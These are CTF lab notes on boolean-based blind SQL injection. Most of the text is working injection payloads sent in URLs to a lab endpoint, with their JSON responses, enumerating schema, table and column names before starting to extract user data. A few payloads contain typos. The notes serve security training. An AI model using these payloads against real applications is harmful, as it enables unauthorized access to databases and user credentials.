# Boolean SQL Injection

### SQL Challenges
**Question 1:** You can use the "and 1=1 " and "and 1=2" queries to detect sql injection in user inputs. Avoid using "or 1=1"
```sql
-- Detecting Boolean SQLi
https://013h5e2x.eu2.ctfio.com/api/checkuser?username=adam' AND 1=1;--

SELECT * FROM users WHERE username='adam' AND 1=1;--'
```
```json
{"taken":true}
```

**Question 2:** Using the `and 1=` operator with a sub-query you can enumerate the database names from the information_schema.SCHEMATA table using a LIKE operator on the SCHEMA_NAME column.
```sql
-- Enumerating Database Name
https://013h5e2x.eu2.ctfio.com/api/checkuser?username=adam' and 1=(select 1 from information_schema.schemata where schema_name like 'a%');--
```
```json
{"taken":false}
```
- Try to change the charactor untill you find the `true` statement.
```sql
https://013h5e2x.eu2.ctfio.com/api/checkuser?username=adam' and 1=(select 1 from information_schema.schemata where schema_name like 'sqli_three%');--
```
```json
{"taken":true}
```

**Question 3:** Using the same method of 1= and now knowing our database names we can query the information_schema.TABLES table and use the like operator against the TABLE_NAME column and specify the database using the TABLE_SCHEMA column.
```sql
-- Enumerating Table Names
https://013h5e2x.eu2.ctfio.com/api/checkuser?username=adam' and 1=(select 1 from information_schema.tables where table_name like 'a%' andteble_schema='sqli_three');--
```
```json
{"taken":false}
```
- Try to change the charactor untill you find the `true` statement.
```sql
https://013h5e2x.eu2.ctfio.com/api/checkuser?username=adam' and 1=(select 1 from information_schema.tables where table_name like 'users%' and table_schema='sqli_three');--
```
```json
{"taken":true}
```

**Question 4:** Using the same method of 1= and now knowing our database names and table names we can query the information_schema.COLUMNS table and use the like operator against the COLUMN_NAME column and specify the database using the TABLE_SCHEMA column and the table using the TABLE_NAME column.
```sql
-- Enumerating Column Names
https://013h5e2x.eu2.ctfio.com/api/checkuser?username=adam' and 1=(select 1 from information_schema.columns where column_name like 'a%' and teble_schema='sqli_three' and table_name='users');--
```
```json
{"taken":false}
```
- Try to change the charactor untill you find the `true` statement.
```sql
https://013h5e2x.eu2.ctfio.com/api/checkuser?username=adam' and 1=(select 1 from information_schema.columns where column_name like 'username%' and table_schema='sqli_three' and table_name='users');--
```
```sql
https://013h5e2x.eu2.ctfio.com/api/checkuser?username=adam' and 1=(select 1 from information_schema.columns where column_name like 'password%' and table_schema='sqli_three' and table_name='users');--
```
```json
{"taken":true}
```

**Question 5:** Now we know the table structure we can try and enumerate data from it.
```sql
-- Enumerating Data
https://013h5e2x.eu2.ctfio.com/api/checkuser?username=adam' and 1=(select 1 from users limit 1);--
```

---

**SQL Lab:** https://app.hackinghub.io/hubs/interactive-sqli-boolean



